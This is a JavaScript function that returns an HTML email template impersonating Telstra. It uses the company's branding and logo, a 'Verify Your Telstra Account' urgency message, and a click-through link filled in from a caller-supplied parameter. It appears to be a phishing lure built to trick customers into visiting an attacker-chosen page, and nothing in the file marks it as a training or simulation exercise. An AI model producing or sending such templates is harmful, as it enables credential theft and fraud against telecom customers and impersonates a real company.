export function getEmailTemplate(link) {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Action Required: Verify Your Telstra Account</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background-color: #f5f5f5;
    }
    .email-container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #ffffff;
    }
    .header-gradient {
      background: linear-gradient(to right, #FFB366 0%, #E8A5D8 100%);
      height: 8px;
      width: 100%;
    }
    .header-content {
      padding: 20px 30px;
      display: flex;
      justify-content: flex-end;
      background-color: #ffffff;
    }
    .telstra-logo {
      width: 40px;
      height: 40px;
    }
    .main-content {
      padding: 40px 30px;
      background-color: #ffffff;
    }
    .title {
      font-size: 28px;
      font-weight: 700;
      color: #582C7F;
      margin: 0 0 30px 0;
      line-height: 1.3;
    }
    .greeting {
      font-size: 16px;
      color: #000000;
      margin: 0 0 20px 0;
      line-height: 1.6;
    }
    .body-text {
      font-size: 16px;
      color: #000000;
      margin: 0 0 20px 0;
      line-height: 1.6;
    }
    .link-container {
      margin: 25px 0;
      padding: 0;
    }
    .link-text {
      font-size: 16px;
      color: #0D54FF;
      text-decoration: underline;
      word-break: break-all;
    }
    .important {
      font-weight: 700;
      color: #000000;
    }
    .closing {
      font-size: 16px;
      color: #000000;
      margin: 30px 0 10px 0;
      line-height: 1.6;
    }
    .signature {
      font-size: 16px;
      color: #000000;
      margin: 5px 0;
      line-height: 1.6;
    }
    .help-section {
      padding: 40px 30px;
      background-color: #ffffff;
      border-top: 1px solid #e0e0e0;
    }
    .help-title {
      font-size: 20px;
      font-weight: 700;
      color: #582C7F;
      margin: 0 0 25px 0;
    }
    .help-items {
      display: flex;
      flex-wrap: wrap;
      gap: 30px;
      margin-bottom: 30px;
    }
    .help-item {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .help-icon {
      width: 24px;
      height: 24px;
      color: #582C7F;
    }
    .help-text {
      font-size: 16px;
      color: #000000;
    }
    .footer-gradient {
      background: linear-gradient(to right, #FFB366 0%, #E8A5D8 50%, #9B7BB8 100%);
      padding: 30px;
      text-align: center;
    }
    .social-icons {
      display: flex;
      justify-content: center;
      gap: 20px;
    }
    .social-icon {
      width: 32px;
      height: 32px;
      background-color: rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ffffff;
      font-weight: 600;
      font-size: 14px;
      text-decoration: none;
    }
    @media only screen and (max-width: 600px) {
      .main-content, .help-section {
        padding: 30px 20px;
      }
      .title {
        font-size: 24px;
      }
      .help-items {
        flex-direction: column;
        gap: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="email-container">
    <!-- Header Gradient -->
    <div class="header-gradient"></div>
    
    <!-- Header with Logo -->
    <div class="header-content">
      <svg class="telstra-logo" viewBox="0 0 33 33" xmlns="http://www.w3.org/2000/svg">
        <g fill="none" fillRule="evenodd">
          <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" fill="#F96449"/>
          <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" fill="#0D54FF"/>
        </g>
      </svg>
    </div>
    
    <!-- Main Content -->
    <div class="main-content">
      <h1 class="title">Action Required: Verify Your Telstra Account</h1>
      
      <p class="greeting">Dear Customer,</p>
      
      <p class="body-text">
        We require you to verify your Telstra account to ensure continued service and security. Please log in to the MyTelstra and follow the instructions under Account Settings or provided by our representative.
      </p>
      
      <p class="body-text">
        Click on the link: <a href="${link}" class="link-text">${link}</a>
      </p>
      
      <p class="body-text">
        For your safety, Telstra will never ask for payment details. If you need further assistance feel free to reply to this email or contact support.
      </p>
      
      <p class="body-text">
        Thank you for your prompt attention.
      </p>
      
      <p class="closing">Kind regards,</p>
      <p class="signature">Telstra Customer Care</p>
      <p class="signature">Telstra Corporation Limited</p>
    </div>
    
    <!-- Help Section -->
    <div class="help-section">
      <h2 class="help-title">Always here to help.</h2>
      <div class="help-items">
        <div class="help-item">
          <svg class="help-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/>
          </svg>
          <span class="help-text">My Telstra</span>
        </div>
        <div class="help-item">
          <svg class="help-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
          </svg>
          <span class="help-text">My Telstra app</span>
        </div>
        <div class="help-item">
          <svg class="help-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
          </svg>
          <span class="help-text">Help & Support</span>
        </div>
      </div>
    </div>
    
    <!-- Footer Gradient with Social Icons -->
    <div class="footer-gradient">
      <div class="social-icons">
        <a href="#" class="social-icon">f</a>
        <a href="#" class="social-icon">in</a>
        <a href="#" class="social-icon">𝕏</a>
      </div>
    </div>
  </div>
</body>
</html>
  `;
}

